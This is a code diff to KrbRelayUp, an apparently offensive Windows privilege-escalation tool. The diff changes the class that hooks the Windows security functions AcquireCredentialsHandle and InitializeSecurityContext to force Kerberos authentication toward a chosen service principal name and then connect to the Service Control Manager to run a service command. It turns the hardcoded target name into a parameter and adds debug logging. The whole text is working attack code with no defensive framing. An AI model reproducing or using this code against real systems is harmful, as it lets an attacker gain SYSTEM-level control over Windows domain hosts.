@@ -10,11 +10,12 @@ namespace KrbRelayUp
 
     class KrbSCM
     {
-        public static string spn = "HOST/WINTERFELL";
+        public static string targetSPN = null;
 
         [STAThread]
         public static int AcquireCredentialsHandleHook(string pszPrincipal, StringBuilder pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry)
         {
+            Console.WriteLine($"[+] AcquireCredentialsHandleHook called for package {pszPackage}\n[+] Changing to Kerberos package");
             pszPackage = new StringBuilder("Kerberos");
             return AcquireCredentialsHandle(pszPrincipal, pszPackage.ToString(), fCredentialUse, PAuthenticationID, pAuthData, pGetKeyFn, pvGetKeyArgument, ref phCredential, ptsExpiry);
         }
@@ -22,12 +23,15 @@ namespace KrbRelayUp
         [STAThread]
         public static int InitializeSecurityContextHook(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, string pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry)
         {
-            int status = InitializeSecurityContext(ref phCredential, ref phContext, spn, fContextReq, Reserved1, TargetDataRep, ref pInput, Reserved2, out phNewContext, out pOutput, out pfContextAttr, out ptsExpiry);
+            Console.WriteLine($"[+] InitializeSecurityContextHook called for target {pszTargetName}");
+            int status = InitializeSecurityContext(ref phCredential, ref phContext, targetSPN, fContextReq, Reserved1, TargetDataRep, ref pInput, Reserved2, out phNewContext, out pOutput, out pfContextAttr, out ptsExpiry);
+            Console.WriteLine($"[+] InitializeSecurityContext status = 0x{status:X8}");
             return status;
         }
 
-        public static void Run(string serviceName, string serviceCommand)
+        public static void Run(string spn, string serviceName, string serviceCommand)
         {
+            targetSPN = spn;
             // Initialize SecurityInterface
             Console.WriteLine("[+] Using ticket to connect to Service Manger");
             IntPtr functionTable = InitSecurityInterface();
